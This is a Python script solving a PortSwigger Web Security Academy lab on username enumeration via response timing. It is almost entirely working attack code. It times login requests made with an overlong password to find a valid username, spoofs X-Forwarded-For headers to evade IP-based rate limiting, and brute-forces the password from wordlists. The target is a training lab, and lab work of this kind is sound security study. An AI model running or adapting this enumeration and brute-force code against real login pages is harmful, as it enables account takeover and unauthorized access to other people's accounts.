# Lab: Username enumeration via response timing

import requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import time

long_pw = "a" * 300
base = "https://0af900ab03a52fcb81e007fc00ea00a3.web-security-academy.net"
guess_session = requests.Session()

print("===========[step1] Recon login fail message===============")
page_recon_login=guess_session.post(f"{base}/login", data={"username": "test", "password": "1234"})
page_recon_result=page_recon_login.text
print(page_recon_result)
'''
[!] Important finding: Invalid username
=> told us what is wrong exactly
                        <p class=is-warning>Invalid username</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
'''

print("===========[step2] prep files for login bruteforce===============")
# prep username/password list (provided by portswigger's academy)
cwd = Path(__file__).resolve().parent
userid_file = cwd / "username.txt" 
pass_file = cwd / "password.txt"

with open(userid_file, "r", encoding="utf-8") as usernamefile:
    username_content=usernamefile.read()

username_list=username_content.splitlines()

with open(pass_file, "r", encoding="utf-8") as passfile:
    pass_content=passfile.read()

pass_list=pass_content.splitlines()

# list for account which can successfully login
print()
print("[*] Ready to Brute Force")
print()
valid_account = []

def try_login(username, password):
    r = requests.post(f"{base}/login",
                      data={"username": username, "password": password},
                      allow_redirects=False)
    return password, r.status_code

print("===============[step3] Find Username with response time===============")
timings = []
for i, username in enumerate(username_list, start=1):
    start = time.time()
    requests.post(f"{base}/login",
                  data={"username": username, "password": long_pw},
                  headers={"X-Forwarded-For": f"10.0.0.{i}"},
                  allow_redirects=False)
    timings.append((time.time() - start, username))

timings.sort(reverse=True)          # 느린 순
for t, u in timings[:5]:
    print(f"{u}: {t:.2f}s")
target = timings[0][1]

print("===============[step4] Input Password with found username===============")
for j, password in enumerate(pass_list, start=1):
    r = requests.post(f"{base}/login",
                      data={"username": target, "password": password},
                      headers={"X-Forwarded-For": f"10.1.0.{j}"},
                      allow_redirects=False)
    if r.status_code == 302:
        print(f"Found: {target} / {password}")
        break